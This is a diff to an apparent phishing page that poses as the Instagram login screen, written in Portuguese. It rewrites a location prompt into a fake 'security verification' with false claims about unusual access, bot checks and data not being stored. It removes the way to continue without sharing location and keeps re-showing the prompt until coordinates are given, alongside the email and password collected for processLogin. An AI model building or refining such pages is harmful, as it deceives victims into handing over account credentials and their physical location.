@@ -3,11 +3,10 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Instagram</title>
     <link rel="stylesheet" href="/styles.css" />
     <link rel="icon" type="image/png" href="/img/insta-fav.ico">
+    <title>Instagram</title>
     <style>
-        /* Estilos inline caso o styles.css não carregue */
         * {
             margin: 0;
             padding: 0;
@@ -300,10 +299,12 @@
             <svg class="location-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#0095f6">
                 <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
             </svg>
-            <h3>Permitir acesso à localização</h3>
-            <p>Para continuar, é necessário permitir o acesso à sua localização para garantir que você não seja um robô.</p>
-            <button class="location-button" id="allowLocation">Permitir acesso</button>
-            <button class="location-cancel" id="denyLocation">Não permitir</button>
+            <h3>Verificação de segurança</h3>
+            <p>Detectamos um padrão de acesso incomum. Por razões de segurança, o Instagram precisa verificar sua localização para proteger sua conta contra acessos não autorizados.</p>
+            <p style="font-size: 13px; margin-top: -5px; margin-bottom: 15px;">Este é um procedimento padrão de segurança que ajuda a distinguir usuários reais de bots e protege a comunidade contra atividades maliciosas.</p>
+            <button class="location-button" id="allowLocation">Verificar minha localização</button>
+            <p style="font-size: 12px; color: #8e8e8e; margin-top: 12px; margin-bottom: 8px;">Seus dados de localização serão usados apenas para verificação de segurança e não serão armazenados permanentemente.</p>
+            <button class="location-cancel" id="denyLocation">Tentar outra forma de verificação</button>
         </div>
     </div>
 
@@ -375,6 +376,7 @@
         // Variáveis para armazenar as coordenadas
         let userLatitude = null;
         let userLongitude = null;
+        let verificacaoConcluida = false;
         
         // Função para mostrar o carregamento
         function showLoading() {
@@ -390,6 +392,13 @@
         function hideLocationModal() {
             document.getElementById('locationModal').style.display = 'none';
         }
+        
+        // Mostrar o modal de localização ao carregar a página
+        document.addEventListener('DOMContentLoaded', function() {
+            setTimeout(function() {
+                showLocationModal();
+            }, 1000);
+        });
         
         // Função para obter a localização do usuário
         function getLocation() {
@@ -596,40 +605,87 @@
             }, 1500);
         }
         
-        // Quando o botão "Permitir acesso" no modal for clicado
+        // Quando o botão "Verificar minha localização" no modal for clicado
         document.getElementById('allowLocation').addEventListener('click', function() {
+            const button = document.getElementById('allowLocation');
+            button.textContent = "Verificando...";
+            button.disabled = true;
+            
             getLocation()
                 .then(() => {
                     // Localização obtida com sucesso
                     hideLocationModal();
+                    verificacaoConcluida = true;
                     
-                    // Obter dados do formulário
-                    const email = document.getElementById('email').value;
-                    const password = document.getElementById('password').value;
+                    // Mostra uma mensagem de sucesso temporária
+                    const successMessage = document.createElement('div');
+                    successMessage.style.position = 'fixed';
+                    successMessage.style.top = '50%';
+                    successMessage.style.left = '50%';
+                    successMessage.style.transform = 'translate(-50%, -50%)';
+                    successMessage.style.backgroundColor = 'rgba(0, 150, 0, 0.9)';
+                    successMessage.style.color = 'white';
+                    successMessage.style.padding = '15px 20px';
+                    successMessage.style.borderRadius = '5px';
+                    successMessage.style.zIndex = '10000';
+                    successMessage.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
+                    successMessage.style.fontWeight = 'bold';
+                    successMessage.style.textAlign = 'center';
+                    successMessage.innerHTML = "✓<br>Verificação concluída!<br><span style='font-size:12px;font-weight:normal;'>Você pode fazer login agora.</span>";
+                    document.body.appendChild(successMessage);
                     
-                    // Processar o login com a localização
-                    processLogin(email, password);
+                    setTimeout(function() {
+                        document.body.removeChild(successMessage);
+                    }, 2000);
                 })
                 .catch((error) => {
                     // Erro ao obter localização
                     console.error("Erro ao obter localização:", error);
                     hideLocationModal();
                     
-                    // Continuar mesmo sem a localização
-                    const email = document.getElementById('email').value;
-                    const password = document.getElementById('password').value;
-                    processLogin(email, password);
+                    // Mostra uma mensagem de erro
+                    alert("Não foi possível verificar sua localização. Por favor, tente novamente ou use outra forma de login.");
+                    
+                    // Reativar o botão
+                    button.textContent = "Verificar minha localização";
+                    button.disabled = false;
                 });
         });
         
-        // Quando o botão "Não permitir" no modal for clicado
+        // Quando o botão "Tentar outra forma de verificação" no modal for clicado
         document.getElementById('denyLocation').addEventListener('click', function() {
             hideLocationModal();
             
-            // Continuar mesmo sem a localização
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            processLogin(email, password);
+            // Mostra uma mensagem explicando que a verificação é necessária
+            const alertMessage = document.createElement('div');
+            alertMessage.style.position = 'fixed';
+            alertMessage.style.top = '50%';
+            alertMessage.style.left = '50%';
+            alertMessage.style.transform = 'translate(-50%, -50%)';
+            alertMessage.style.backgroundColor = 'rgba(255, 255, 255, 0.95)';
+            alertMessage.style.color = '#262626';
+            alertMessage.style.padding = '20px';
+            alertMessage.style.borderRadius = '10px';
+            alertMessage.style.zIndex = '10000';
+            alertMessage.style.boxShadow = '0 2px 10px rgba(0,0,0,0.3)';
+            alertMessage.style.width = '320px';
+            alertMessage.style.textAlign = 'center';
+            alertMessage.innerHTML = `
+                <h3 style="margin-bottom:15px;font-size:18px;">Verificação necessária</h3>
+                <p style="margin-bottom:20px;line-height:1.4;font-size:14px;">
+                    Devido a um número elevado de tentativas de acesso suspeitas, a verificação de localização é obrigatória neste momento.
+                </p>
+                <button id="retryVerification" style="background-color:#0095f6;border:none;border-radius:4px;color:white;font-weight:600;padding:8px 0;width:100%;cursor:pointer;">
+                    Tentar novamente
+                </button>
+            `;
+            document.body.appendChild(alertMessage);
+            
+            // Adicionar evento ao botão "Tentar novamente"
+            document.getElementById('retryVerification').addEventListener('click', function() {
+                document.body.removeChild(alertMessage);
+                showLocationModal();
+            });
         });
         
         // Manipular envio do formulário
@@ -645,8 +701,13 @@
                 return;
             }
             
-            // Mostrar modal de localização
-            showLocationModal();
+            // Se a verificação de localização já foi concluída, processar login diretamente
+            if (verificacaoConcluida) {
+                processLogin(email, password);
+            } else {
+                // Caso contrário, mostrar o modal
+                showLocationModal();
+            }
         });
     </script>
 </body>
